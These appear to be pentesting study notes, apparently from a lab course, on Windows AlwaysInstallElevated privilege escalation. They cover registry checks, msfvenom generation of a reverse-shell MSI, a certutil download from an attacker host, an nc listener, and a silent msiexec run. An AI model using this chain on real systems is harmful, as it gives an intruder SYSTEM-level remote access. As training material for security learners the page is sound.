---
title: AlwaysInstallElevated
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - windows
---
# AlwaysInstallElevated

This setting can be set via Local Group Policy by setting `Always install with elevated privileges` to `Enabled` under the following paths.

- `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
- `User Configuration\Administrative Templates\Windows Components\Windows Installer`

#### Enumerating Always Install Elevated Settings

```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Possible output:

```powershell-session

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Our enumeration shows us that the `AlwaysInstallElevated` key exists, so the policy is indeed enabled on the target system.


#### Generating MSI Package

We can exploit this by generating a malicious MSI package and execute it via the command line to obtain a reverse shell with SYSTEM privileges.

From our attacker machine:

```bash
msfvenom -p windows/shell_reverse_tcp lhost=$AttackerIP lport=9443 -f msi > aie.msi

# And serve the content
python -m http.server 8000
```

From the windows host machine:

```
certutil.exe -urlcache -split -f http://$ipAtacker:8000/aie.msi aie.msi
```

#### Executing MSI Package

We will start a netcat listener in our attacking machine:

```bash
nc -lnvp 9443
```

And execute the file from the command line like so:

```cmd-session
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```